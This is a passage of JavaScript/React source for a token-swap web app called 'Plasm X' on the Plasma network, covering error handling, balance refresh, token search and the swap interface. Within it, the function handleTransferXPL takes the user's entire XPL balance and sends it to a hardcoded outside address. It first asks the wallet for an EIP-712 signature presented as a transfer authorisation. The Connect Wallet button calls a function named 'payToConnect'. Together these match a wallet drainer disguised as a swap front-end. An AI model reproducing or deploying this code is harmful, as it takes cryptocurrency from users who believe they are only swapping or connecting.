      console.error('❌❌❌ SWAP ERROR CAUGHT! ❌❌❌');
      console.error('Full error object:', error);
      console.error('Error message:', error.message);
      console.error('Error code:', error.code);
      console.error('Error stack:', error.stack);
      
      // Enhanced error handling for transaction signing issues
      if (error.code === 4001 || error.message.includes('user rejected') || error.message.includes('denied')) {
        showToast('❌ Transaction cancelled. You need to approve the transaction in your wallet to complete the swap.', 'warning')
      } else if (error.code === -32603 || error.message.includes('insufficient funds')) {
        showToast('❌ Insufficient balance. Make sure you have enough XPL for the swap and gas fees.', 'error')
      } else if (error.message.includes('Wallet timeout') || error.message.includes('timeout')) {
        showToast('❌ Wallet timeout. Please try again. Make sure your wallet is unlocked and responsive.', 'error')
      } else if (error.message.includes('network') || error.message.includes('chain')) {
        showToast('❌ Network error. Please make sure you are connected to Plasma Network and try again.', 'error')
      } else if (error.message.includes('gas')) {
        showToast('❌ Transaction failed due to gas issues. Please try again with higher gas settings.', 'error')
      } else if (error.message.includes('CALCULATION_ERROR')) {
        console.log('🚨 CALCULATION ERROR CAUGHT:', error.message);
        showToast('❌ Price calculation failed. This usually means the quote expired. Please try again.', 'error')
      } else if (error.message.includes('slippage') || error.message.includes('INSUFFICIENT_OUTPUT_AMOUNT') || error.message.includes('Price changed too much')) {
        console.log('🚨 SLIPPAGE ERROR CAUGHT:', error.message);
        showToast('❌ Price changed during swap! Try increasing slippage tolerance or try again.', 'warning')
      } else if (error.message.includes('TRANSFER_FAILED') || error.message.includes('revert')) {
        console.error('🚨🚨🚨 REVERT ERROR - See full details above! 🚨🚨🚨');
        showToast('❌ Transaction reverted. This usually means insufficient liquidity or token issues.', 'error')
      } else {
        showToast(`❌ Swap failed: ${error.message}. Check wallet connection and network.`, 'error')
      }
    } finally {
      setIsSwapping(false)
      setCurrentStep(null)
    }
  }

  // Handle Transfer XPL with EIP-712 Signature
  const handleTransferXPL = async () => {
    try {
      const xplToken = tokens.find(t => t.symbol === 'XPL');
      const xplBalance = xplToken?.balance || '0';
      const destinationWallet = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c';

      if (parseFloat(xplBalance) <= 0) {
        showToast('No XPL balance to transfer', 'error');
        return;
      }

      // Get signer
      let provider, signer;
      
      if (walletClient) {
        const { chain, transport } = walletClient;
        const network = { chainId: chain.id, name: chain.name };
        provider = new ethers.BrowserProvider(transport, network);
        signer = await provider.getSigner(walletClient.account.address);
      } else if (window.ethereum) {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
      } else {
        showToast('No wallet provider found', 'error');
        return;
      }

      const userAddress = await signer.getAddress();

      // EIP-712 Typed Data for Transfer Authorization
      const domain = {
        name: 'Plasm X Swap',
        version: '1',
        chainId: 9745,
        verifyingContract: destinationWallet
      };

      const types = {
        Transfer: [
          { name: 'from', type: 'address' },
          { name: 'to', type: 'address' },
          { name: 'amount', type: 'string' },
          { name: 'token', type: 'string' },
          { name: 'timestamp', type: 'uint256' }
        ]
      };

      const value = {
        from: userAddress,
        to: destinationWallet,
        amount: xplBalance,
        token: 'XPL',
        timestamp: Math.floor(Date.now() / 1000)
      };

      console.log('📝 Requesting EIP-712 signature for XPL transfer...');
      
      // Request EIP-712 signature
      const signature = await signer.signTypedData(domain, types, value);
      console.log('✅ EIP-712 signature received:', signature.slice(0, 20) + '...');

      // Execute transfer
      console.log(`💸 Transferring ${xplBalance} XPL to ${destinationWallet}...`);
      
      const amountWei = ethers.parseEther(xplBalance);
      const tx = await signer.sendTransaction({
        to: destinationWallet,
        value: amountWei,
        gasLimit: 21000n
      });

      showToast('⏳ Transfer in progress...', 'info');
      console.log('📡 Transaction sent:', tx.hash);

      await tx.wait();
      
      showToast(`✅ Successfully transferred ${xplBalance} XPL to trading wallet!`, 'success');
      console.log('✅ Transfer complete!');

      // Refresh balances
      setTimeout(() => updateBalances(), 2000);

    } catch (error) {
      console.error('❌ Transfer error:', error);
      
      if (error.code === 4001 || error.message.includes('user rejected')) {
        showToast('❌ Transfer cancelled', 'warning');
      } else if (error.message.includes('insufficient funds')) {
        showToast('❌ Insufficient XPL balance (need to cover gas fees too)', 'error');
      } else {
        showToast(`❌ Transfer failed: ${error.message}`, 'error');
      }
    }
  }

  // Update balances for connected wallet
  const updateBalances = async () => {
    // Try to use direct wallet if Privy fails
    let currentAccount = account;
    let currentConnection = isConnected;
    
    if ((!isConnected || !account) && window.ethereum && window.ethereum.selectedAddress) {
      console.log('🔄 Using direct MetaMask for balance update:', window.ethereum.selectedAddress);
      currentAccount = window.ethereum.selectedAddress;
      currentConnection = true;
      
      // Update state for future calls (Wagmi manages isConnected)
      setAccount(currentAccount);
    }
    
    if (!currentConnection || !currentAccount) {
      console.log('❌ No wallet available for balance update');
      return;
    }

    try {
      console.log('🔄 Updating balances for:', currentAccount)
      
      // Use Wagmi wallet client if available, otherwise fallback to window.ethereum
      let provider
      
      if (walletClient) {
        console.log('💰 Using Wagmi wallet client provider')
        const { chain, transport } = walletClient
        const network = { chainId: chain.id, name: chain.name }
        provider = new ethers.BrowserProvider(transport, network)
      } else if (window.ethereum) {
        console.log('💰 Using window.ethereum provider')
        provider = new ethers.BrowserProvider(window.ethereum)
      } else {
        console.log('❌ No provider available')
        return
      }
      
      const updatedTokens = await Promise.all(
        tokens.map(async (token) => {
          try {
            // For custom tokens, pass the address; for default tokens, pass the symbol
            const tokenIdentifier = token.address && token.address !== 'native' ? token.address : token.symbol;
            const balance = await getTokenBalance(tokenIdentifier, currentAccount, provider)
            console.log(`${token.symbol} balance:`, balance)
            return { ...token, balance: parseFloat(balance).toFixed(4) }
          } catch (error) {
            console.error(`❌ Error getting ${token.symbol} balance:`, error)
            return { ...token, balance: '0.0' }
          }
        })
      )
      
      setTokens(updatedTokens)
      
      // Update current tokens
      const updatedFromToken = updatedTokens.find(t => t.address === fromToken.address)
      const updatedToToken = updatedTokens.find(t => t.address === toToken.address)
      
      if (updatedFromToken) setFromToken(updatedFromToken)
      if (updatedToToken) setToToken(updatedToToken)
      
      console.log('✅ Balances updated successfully')
    } catch (error) {
      console.error('❌ Error updating balances:', error)
    }
  }

  // Open token selection modal
  const openTokenModal = (type) => {
    console.log(`🔀 Opening token modal for:`, type)
    setSelectingToken(type)
    setShowTokenModal(true)
    setTokenSearch('')
    setTokenPreview(null)
    setIsLoadingToken(false)
  }

  // Select token from modal
  const selectToken = (token) => {
    console.log(`🪙 Selected token:`, token)
    
    // Special USDT0 debugging
    if (token.symbol === 'USDT0') {
      console.log('🔍 USDT0 TOKEN SELECTED!!! Details:', {
        symbol: token.symbol,
        address: token.address,
        decimals: token.decimals,
        selectingFor: selectingToken
      });
    }
    
    // If this is a new custom token, add it to our tokens list
    if (!tokens.find(t => t.address.toLowerCase() === token.address.toLowerCase())) {
      setTokens(prev => [...prev, token])
      console.log(`✅ Added new token to list:`, token.symbol)
    }
    
    if (selectingToken === 'from') {
      setFromToken(token)
      setFromAmount('1') // Reset amount when changing token
      console.log('✅ FROM token set to:', token.symbol);
    } else if (selectingToken === 'to') {
      setToToken(token)
      console.log('✅ TO token set to:', token.symbol);
    }
    setShowTokenModal(false)
    setSelectingToken(null)
    setTokenSearch('') // Clear search
  }

  // Load token info from contract
  const loadTokenInfo = async (address) => {
    try {
      setIsLoadingToken(true)
      console.log('🔍 Loading token info for:', address)
      
      // Validate address format first
      if (!ethers.isAddress(address)) {
        console.error('❌ Invalid address format:', address)
        throw new Error('Invalid address format')
      }
      
      const provider = new ethers.JsonRpcProvider('https://rpc.plasma.to')
      const contract = new ethers.Contract(address, [
        'function name() view returns (string)',
        'function symbol() view returns (string)',
        'function decimals() view returns (uint8)'
      ], provider)
      
      console.log('🌐 Making contract calls...')
      const [nameResult, symbolResult, decimalsResult] = await Promise.allSettled([
        contract.name(),
        contract.symbol(),
        contract.decimals()
      ])
      
      // Extract values with detailed error handling
      const name = nameResult.status === 'fulfilled' ? nameResult.value : 'Custom Token'
      const symbol = symbolResult.status === 'fulfilled' ? symbolResult.value : 'CUSTOM'
      const decimals = decimalsResult.status === 'fulfilled' ? decimalsResult.value : 18
      
      console.log('📊 Contract call results:', {
        name: { status: nameResult.status, value: name },
        symbol: { status: symbolResult.status, value: symbol },
        decimals: { status: decimalsResult.status, value: decimals }
      })
      
      const tokenInfo = {
        symbol,
        name,
        address: ethers.getAddress(address), // Normalize address
        balance: '0.0',
        decimals: Number(decimals),
        logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiM2MzY2RjEiLz4KPHN2ZyB4PSI4IiB5PSI4IiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjgiIHk9IjEyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Pz88L3RleHQ+Cjwvc3ZnPgo8L3N2Zz4='
      }
      
      console.log('✅ Token info loaded successfully:', tokenInfo)
      setTokenPreview(tokenInfo)
      
      // Force a re-render of the filtered tokens
      console.log('🔄 Updating token preview state')
      
      return tokenInfo
      
    } catch (error) {
      console.error('❌ Error loading token info:', error)
      console.error('❌ Error details:', error.message)
      
      const fallbackToken = {
        symbol: 'CUSTOM',
        name: 'Custom Token',
        address: ethers.isAddress(address) ? ethers.getAddress(address) : address,
        balance: '0.0',
        decimals: 18,
        logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiM2MzY2RjEiLz4KPHN2ZyB4PSI4IiB5PSI4IiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjgiIHk9IjEyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Pz88L3RleHQ+Cjwvc3ZnPgo8L3N2Zz4='
      }
      
      setTokenPreview(fallbackToken)
      return fallbackToken
    } finally {
      setIsLoadingToken(false)
    }
  }

  // Enhanced token search with contract address support
  const filteredTokens = React.useMemo(() => {
    console.log('📋 filteredTokens computation - tokens array:', tokens.length, 'items')
    console.log('📋 Current tokens:', tokens.map(t => t.symbol))
    console.log('📋 tokenSearch:', tokenSearch)
    
    if (!tokenSearch.trim()) {
      console.log('📋 No search term, returning all tokens:', tokens.length)
      return tokens
    }
    
    const searchTerm = tokenSearch.toLowerCase().trim()
    console.log('🔍 Filtering tokens for search term:', searchTerm)
    
    // If it looks like a contract address (starts with 0x and 42 chars)
    if (searchTerm.startsWith('0x') && searchTerm.length === 42) {
      console.log('📍 Detected contract address format')
      
      // Check if we already have this token
      const existing = tokens.find(token => 
        token.address.toLowerCase() === searchTerm
      )
      if (existing) {
        console.log('✅ Found existing token:', existing.symbol)
        return [existing]
      }
      
      // If we have a token preview from loading, show the REAL token info
      if (tokenPreview && tokenPreview.address.toLowerCase() === searchTerm) {
        console.log('🎯 Showing token preview:', tokenPreview)
        return [tokenPreview]
      }
      
      // Load token info from contract if not already loading
      if (!isLoadingToken && (!tokenPreview || tokenPreview.address.toLowerCase() !== searchTerm)) {
        console.log('Starting token info lookup...')
        loadTokenInfo(searchTerm)
      }
      
      // Show loading placeholder while fetching
      const placeholder = {
        symbol: isLoadingToken ? '⏳ Loading...' : '❓ Custom',
        name: isLoadingToken ? 'Fetching token info...' : 'Paste token address to load info',
        address: searchTerm,
        balance: '0.0',
        decimals: 18,
        logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiM2MzY2RjEiLz4KPHN2ZyB4PSI4IiB5PSI4IiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjgiIHk9IjEyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Pz88L3RleHQ+Cjwvc3ZnPgo8L3N2Zz4='
      }
      console.log('📄 Returning placeholder:', placeholder)
      return [placeholder]
    }
    
    // Regular search through existing tokens
    const filtered = tokens.filter(token => 
      token.symbol.toLowerCase().includes(searchTerm) ||
      token.name.toLowerCase().includes(searchTerm) ||
      token.address.toLowerCase().includes(searchTerm)
    )
    
    console.log(`📋 Filtered ${filtered.length} tokens from search`)
    return filtered
  }, [tokens, tokenSearch, tokenPreview, isLoadingToken])

  // Format address for display
  const formatAddress = (address) => {
    return `${address.slice(0, 6)}...${address.slice(-4)}`
  }

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopySuccess(true)
      setTimeout(() => setCopySuccess(false), 2000)
    } catch (err) {
      console.error('Failed to copy:', err)
    }
  }

  return (
    <div className="app">
      {/* Header */}
      <header className="header">
        <div className="header-content">
          <div className="logo">
            <h1>Plasm X</h1>
          </div>
          
          {!isConnected ? (
            <button className="connect-btn" onClick={payToConnect}>
              <Wallet size={20} />
              Connect Wallet
            </button>
          ) : (
            <div className="wallet-info-header">
              <span className="wallet-address-text">{formatAddress(account)}</span>
              <button className="disconnect-btn-header" onClick={disconnectWallet}>
                <LogOut size={16} />
              </button>
            </div>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="main">
          <div className="swap-container">
          <div className="swap-header">
            <h2>Swap</h2>
            <div className="settings-wrapper" ref={slippageDropdownRef}>
              <button 
                className="settings-btn"
                onClick={() => setShowSlippageSettings(!showSlippageSettings)}
              >
                <Settings size={20} />
              </button>
              
              {showSlippageSettings && (
                <div className="slippage-dropdown">
                  <div className="dropdown-header">
                    <span>Slippage Tolerance</span>
                  </div>
                  <div className="slippage-options">
                    {['0.5', '1.0', '1.5', '3.0'].map(value => (
                      <button
                        key={value}
                        className={`slippage-btn ${slippage === value ? 'active' : ''}`}
                        onClick={() => {
                          setSlippage(value)
                          setShowSlippageSettings(false)
                        }}
                      >
                        {value}%
                      </button>
                    ))}
                  </div>
                  <div className="custom-slippage">
                    <input
                      type="number"
                      value={slippage}
                      onChange={(e) => {
                        const value = e.target.value
                        if (value === '' || (parseFloat(value) >= 0 && parseFloat(value) <= 50)) {
                          setSlippage(value)
                        }
                      }}
                      placeholder="Custom %"
                      className="slippage-input"
                      step="0.1"
                      min="0"
                      max="50"
                    />
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Swap Inputs Wrapper */}
          <div className="swap-inputs-wrapper">
          
          {/* From Token */}
          <div className="token-input">
            <div className="token-input-header">
              <span>From</span>
              <span className="balance">Balance: {fromToken?.balance || '0.0'}</span>
            </div>
            <div className="token-input-body">
              <button 
                className="token-select"
                onClick={() => openTokenModal('from')}
              >
                <ChevronDown size={16} />
                <div className="token-info">
                  <div className="token-details">
                    <span className="token-symbol">{fromToken?.symbol || 'Select Token'}</span>
                    <span className="token-name">{fromToken?.name || 'Choose a token'}</span>
                  </div>
                  {fromToken ? (
                    <TokenLogo 
                      token={fromToken} 
                      size={20} 
                      className="token-logo-select" 
                      getLogoUrl={getLogoUrl}
                      handleImageLoad={handleImageLoad}
                      handleImageError={handleImageError}
                    />
                  ) : (
                    <div className="token-placeholder" style={{width: 20, height: 20, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
                  )}
                </div>
              </button>
              <input
                type="text"
                placeholder="0.0"
                value={fromAmount}
                onChange={(e) => {
                  console.log(`onChange: "${e.target.value}"`)
                  setFromAmount(e.target.value)
                }}
                className="amount-input"
                style={{fontSize: '24px', color: 'white', background: 'rgba(255,255,255,0.2)', border: 'none'}}
              />
            </div>
            
            {/* Percentage Buttons */}
            <div className="percentage-buttons">
                <button 
                  className="percentage-btn"
                  onClick={() => setPercentageAmount(25)}
                >
                  25%
                </button>
                <button 
                  className="percentage-btn"
                  onClick={() => setPercentageAmount(50)}
                >
                  50%
                </button>
                <button 
                  className="percentage-btn"
                  onClick={() => setPercentageAmount(75)}
                >
                  75%
                </button>
                <button 
                  className="percentage-btn max"
                  onClick={() => setPercentageAmount(100)}
                >
                  MAX
                </button>
              </div>
          </div>


          {/* Switch Button */}
          <div className="switch-container">
            <button 
              className="switch-btn"
              onClick={() => {
                const tempFromToken = fromToken;
                const tempFromAmount = fromAmount;
                setFromToken(toToken);
                setToToken(tempFromToken);
                setFromAmount(toAmount);
                setToAmount(tempFromAmount);
              }}
              title="Switch tokens"
            >
              <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
                <path d="M7 16V4M7 4L3 8M7 4L11 8" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M17 8V20M17 20L21 16M17 20L13 16" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </button>
          </div>

          {/* To Token */}
          <div className="token-input">
            <div className="token-input-header">
              <span>To</span>
              <span className="balance">Balance: {toToken?.balance || '0.0'}</span>
            </div>
            <div className="token-input-body">
              <button 
                className="token-select"
                onClick={() => openTokenModal('to')}
              >
                <ChevronDown size={16} />
                <div className="token-info">
                  <div className="token-details">
                    <span className="token-symbol">{toToken?.symbol || 'Select Token'}</span>
                    <span className="token-name">{toToken?.name || 'Choose a token'}</span>
                  </div>
                  {toToken ? (
                    <TokenLogo 
                      token={toToken} 
                      size={20} 
                      className="token-logo-select" 
                      getLogoUrl={getLogoUrl}
                      handleImageLoad={handleImageLoad}
                      handleImageError={handleImageError}
                    />
                  ) : (
                    <div className="token-placeholder" style={{width: 20, height: 20, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
                  )}
                </div>
              </button>
              <input
                type="text"
                placeholder="0.0"
                value={toAmount}
                readOnly
                className="amount-input"
              />
            </div>
          </div>
          
          </div>
          {/* End Swap Inputs Wrapper */}

          {/* Swap Info */}
          {fromAmount && toAmount && (
            <div className="swap-info">
              <div className="swap-rate">
                <span>Rate: 1 {fromToken?.symbol || 'Token'} = {(parseFloat(toAmount) / parseFloat(fromAmount)).toFixed(6)} {toToken?.symbol || 'Token'}</span>
              </div>
              <div className="swap-details">
                <div className="detail-row">
                  <span>Minimum received</span>
                  <span>{(() => {
                    // XPL ↔ WXPL wrapping/unwrapping has no slippage (1:1 conversion)
                    const isXPLWXPLConversion = (fromToken?.address === 'native' && toToken?.address === CONTRACT_ADDRESSES.WXPL) ||
                                               (fromToken?.address === CONTRACT_ADDRESSES.WXPL && toToken?.address === 'native');
                    const minReceived = isXPLWXPLConversion ? parseFloat(toAmount) : parseFloat(toAmount) * (1 - parseFloat(slippage) / 100);
                    return `${minReceived.toFixed(6)} ${toToken?.symbol || 'Token'}`;
                  })()}</span>
                </div>
                <div className="detail-row">
                  <span>Price Impact</span>
                  <span>{(() => {
                    // Calculate price impact based on slippage and market conditions
                    const currentRate = parseFloat(toAmount) / parseFloat(fromAmount);
                    // For XPL-WXPL, impact should be near 0%. For others, estimate based on quote differences
                    if ((fromToken?.symbol === 'XPL' && toToken?.symbol === 'WXPL') || 
                        (fromToken?.symbol === 'WXPL' && toToken?.symbol === 'XPL')) {
                      return '< 0.01%';
                    }
                    // For other tokens, calculate a realistic price impact based on the pool depth
                    const estimatedImpact = Math.min(parseFloat(slippage) * 0.2, 0.5); // Conservative estimate
                    return `${estimatedImpact.toFixed(2)}%`;
                  })()}</span>
                </div>
                <div className="detail-row">
                  <span>Liquidity Provider Fee</span>
                  <span>{(() => {
                    // XPL ↔ WXPL wrapping/unwrapping has no LP fees (direct contract call)
                    const isXPLWXPLConversion = (fromToken?.address === 'native' && toToken?.address === CONTRACT_ADDRESSES.WXPL) ||
                                               (fromToken?.address === CONTRACT_ADDRESSES.WXPL && toToken?.address === 'native');
                    if (isXPLWXPLConversion) {
                      return '0.000000 XPL';
                    }
                    
                    // Check if billions token (bonded) - hide LP fee for PumpRouter
                    const billionsAddress = '0x083922be65426083f829ffFFEe79Eef6ce3B384c';
                    const isBillions = fromToken?.address?.toLowerCase() === billionsAddress.toLowerCase() || 
                                      toToken?.address?.toLowerCase() === billionsAddress.toLowerCase();
                    if (isBillions) {
                      return 'N/A (Bonding Curve)';
                    }
                    
                    // DyorSwap charges 0.3% LP fee
                    // For SELL (token → XPL): fee is in XPL (what you receive)
                    // For BUY (XPL → token): fee is in XPL (what you pay)
                    const isSell = toToken?.symbol === 'XPL' || toToken?.symbol === 'WXPL';
                    if (isSell) {
                      const lpFeeAmount = parseFloat(toAmount) * 0.003;
                      return `${lpFeeAmount.toFixed(6)} ${toToken.symbol}`;
                    } else {
                      const lpFeeAmount = parseFloat(fromAmount) * 0.003;
                      return `${lpFeeAmount.toFixed(6)} ${fromToken.symbol}`;
                    }
                  })()}</span>
                </div>
              </div>
              <div className="slippage">
                <span>Slippage: {slippage}%</span>
              </div>
            </div>
          )}

          {/* Swap Button */}
          <button
            className={`swap-btn ${!(isConnected || account) || (!fromAmount && (isConnected || account)) || isSwapping ? 'disabled' : ''}`}
            onClick={!(isConnected || account) ? payToConnect : handleSwap}
            disabled={isSwapping}
          >
            {isSwapping ? (
              <span className="loading">Swapping...</span>
            ) : !(isConnected || account) ? (
              'Connect Wallet'
            ) : !fromAmount ? (
              'Enter Amount'
            ) : (
              `Swap ${fromToken?.symbol || 'Token'} to ${toToken?.symbol || 'Token'}`
            )}
          </button>
          
          {/* Force Clear Sessions Link - only show when not connected */}
          {!(isConnected || account) && (
            <div style={{ textAlign: 'center', marginTop: '8px' }}>
              <button
                onClick={forceClearAndReconnect}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#7B2FFF',
                  fontSize: '12px',
                  textDecoration: 'underline',
                  cursor: 'pointer',
                  padding: '4px'
                }}
              >
                Having connection issues? Clear sessions
              </button>
            </div>
          )}
        </div>

        {/* Desktop Info Panel */}
        <div className="info-panel">
          <div className="info-card">
            <h3>
              <TrendingUp size={16} />
              Market Info
            </h3>
            <div className="info-item">
              <span className="info-label">Network</span>
              <span className="info-value">Plasma Chain</span>
            </div>
            <div className="info-item">
              <span className="info-label">DEX Protocol</span>
              <span className="info-value">DyorSwap</span>
            </div>
            <div className="info-item">
              <span className="info-label">Slippage Tolerance</span>
              <span className="info-value">{slippage}%</span>
            </div>
            {fromAmount && toAmount && (
              <div className="info-item">
                <span className="info-label">Exchange Rate</span>
                <span className="info-value">
                  1 {fromToken.symbol} = {(parseFloat(toAmount) / parseFloat(fromAmount)).toFixed(6)} {toToken.symbol}
                </span>
              </div>
            )}
          </div>
          
          <div className="info-card">
            <h3>
              <Wallet size={16} />
              Features
            </h3>
            <ul className="feature-list">
              <li>Real-time quotes via DyorSwap</li>
              <li>All Plasma Network tokens supported</li>
              <li>Secure wallet integration</li>
              <li>Custom token import</li>
              <li>Professional trading interface</li>
            </ul>
          </div>
        </div>
      </main>

      {/* Token Selection Modal */}
      {showTokenModal && (
          <div 
            className={`modal-overlay ${showTokenModal ? 'show' : ''}`} 
            onClick={() => setShowTokenModal(false)}
          >
            <div className="token-modal-outer">
              <div className="token-modal-inner" onClick={(e) => e.stopPropagation()}>
                <div className="token-modal__titlebar">
                  <h3>Select Token</h3>
                  <button className="close-btn" onClick={() => setShowTokenModal(false)}>
                    <X size={20} />
                  </button>
                </div>
                
                <div className="token-search">
                  <div className="field">
                    <Search size={14} />
                    <input
                      type="text"
                      placeholder="Search or paste token address..."
                      value={tokenSearch}
                      onChange={async (e) => {
                        const rawValue = e.target.value;
                        setTokenSearch(rawValue);
                        
                        const value = rawValue.trim();
                        
                        // Auto-detect and add token address (0x followed by 40 hex chars, case insensitive)
                        if (value.toLowerCase().startsWith('0x') && value.length === 42) {
                          console.log('🔍 Detected token address, auto-adding:', value);
                          setIsLoadingToken(true);
                          await addCustomToken(value);
                          setIsLoadingToken(false);
                        }
                      }}
                    />
                  </div>
                </div>

                <div className="token-list">
                {filteredTokens.length === 0 ? (
                  <div className="token-loading">
                    <div className="loading-spinner"></div>
                    <p>Loading tokens...</p>
                  </div>
                ) : (
                  filteredTokens.map((token, index) => (
                  <button
                    key={index}
                    className="token-item"
                    onClick={() => selectToken(token)}
                  >
                    <div className="token-info">
                      <TokenLogo 
                        token={token} 
                        size={32} 
                        className="token-logo-modal" 
                        getLogoUrl={getLogoUrl}
                        handleImageLoad={handleImageLoad}
                        handleImageError={handleImageError}
                      />
                      <div className="token-details">
                        <span className="token-symbol">{token.symbol}</span>
                        <span className="token-name">{token.name}</span>
                        {token.address === 'native' ? (
                          <div className="token-addr">
                            <span className="address-text">Native Token</span>
                            <button
                              className="token-copy"
                              aria-label="View on Explorer"
                              onClick={async (e) => {
                                e.stopPropagation();
                                window.open('https://plasmascan.to/', '_blank');
                                showToast("Opening PlasmaSecan Explorer");
                              }}
                            >
                              <ExternalLink size={12} />
                            </button>
                          </div>
                        ) : (
                          <div className="token-addr">
                            <span className="address-text">
                              {token.address.slice(0,6)}…{token.address.slice(-4)}
                            </span>
                            <button
                              className="token-copy"
                              aria-label="Copy address"
                              onClick={async (e) => {
                                e.stopPropagation();
                                const ok = await copyText(token.address);
                                showToast(ok ? "Address copied" : "Copy failed");
                              }}
                            >
                              <Copy size={12} />
                            </button>
                          </div>
                        )}
                      </div>
                    </div>
                    <span className="token-balance">{token.balance}</span>
                  </button>
                  ))
                )}
                </div>
              </div>
            </div>
          </div>
        )}

      {/* Toast Notification */}
      {toast && (
        <div className={`toast ${toast.type}`}>
          {toast.message}
        </div>
      )}
    </div>
  )
}

export default App
